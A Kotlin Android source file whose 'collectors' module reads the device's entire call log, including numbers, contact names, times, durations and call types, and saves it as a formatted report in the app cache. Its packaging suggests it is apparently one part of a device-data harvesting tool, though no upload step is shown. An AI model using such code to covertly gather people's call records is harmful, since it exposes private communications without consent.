package com.kashem.shaikh.collectors

import android.content.ContentResolver
import android.content.Context
import android.provider.CallLog
import com.kashem.shaikh.services.AppLogs
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object Calls {

    fun collectCalls(context: Context): File? {
        val resolver: ContentResolver = context.contentResolver
        val uri = CallLog.Calls.CONTENT_URI

        val cursor = try {
            resolver.query(uri, null, null, null, null)
        } catch (e: SecurityException) {
            AppLogs.error("Calls: permission denied", e)
            return null
        } catch (e: Exception) {
            AppLogs.error("Calls: query failed", e)
            return null
        } ?: return null

        val sb = StringBuilder()
        sb.appendLine("***** CALL LOGS *****")
        sb.appendLine()
        sb.appendLine("Generated : ${
            SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
        }")
        sb.appendLine()

        var count = 0
        val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())

        // ✅ FIX: cursor.use { } — exception হলেও guaranteed close
        cursor.use { c ->
            val numberCol = c.getColumnIndex(CallLog.Calls.NUMBER)
            val typeCol = c.getColumnIndex(CallLog.Calls.TYPE)
            val dateCol = c.getColumnIndex(CallLog.Calls.DATE)
            val durationCol = c.getColumnIndex(CallLog.Calls.DURATION)
            val nameCol = c.getColumnIndex(CallLog.Calls.CACHED_NAME)

            try {
                while (c.moveToNext()) {
                    // ✅ FIX: column index -1 হলে safe fallback
                    val number = if (numberCol >= 0) c.getString(numberCol) ?: "Unknown" else "Unknown"
                    val name = if (nameCol >= 0) c.getString(nameCol) ?: "" else ""
                    val date = if (dateCol >= 0) {
                        try { dateFormat.format(Date(c.getLong(dateCol))) }
                        catch (_: Exception) { "Unknown" }
                    } else "Unknown"
                    val duration = if (durationCol >= 0) c.getString(durationCol) ?: "0" else "0"

                    val type = if (typeCol >= 0) {
                        when (c.getInt(typeCol)) {
                            CallLog.Calls.INCOMING_TYPE -> "Incoming"
                            CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                            CallLog.Calls.MISSED_TYPE -> "Missed"
                            CallLog.Calls.REJECTED_TYPE -> "Rejected"
                            CallLog.Calls.BLOCKED_TYPE -> "Blocked"
                            else -> "Unknown"
                        }
                    } else "Unknown"

                    val durSec = duration.toLongOrNull() ?: 0L
                    val durFmt = if (durSec > 0) {
                        String.format(Locale.US, "%d min %d sec", durSec / 60, durSec % 60)
                    } else "0 sec"

                    val displayName = if (name.isNotBlank()) " ($name)" else ""

                    sb.appendLine("[$type] $date")
                    sb.appendLine("  Number   : $number$displayName")
                    sb.appendLine("  Duration : $durFmt")
                    sb.appendLine()
                    count++
                }
            } catch (e: Exception) {
                AppLogs.error("Calls: iteration failed", e)
            }
        }

        if (count == 0) {
            AppLogs.warn("Calls: no call logs found")
            return null
        }

        sb.appendLine("─────────────────────")
        sb.appendLine("Total: $count call logs")

        return try {
            val file = File(context.cacheDir, "calls.txt")
            FileOutputStream(file).use { it.write(sb.toString().toByteArray()) }
            AppLogs.info("Calls: $count logs collected (${file.length()} bytes)")
            file
        } catch (e: Exception) {
            AppLogs.error("Calls: file write failed", e)
            null
        }
    }
}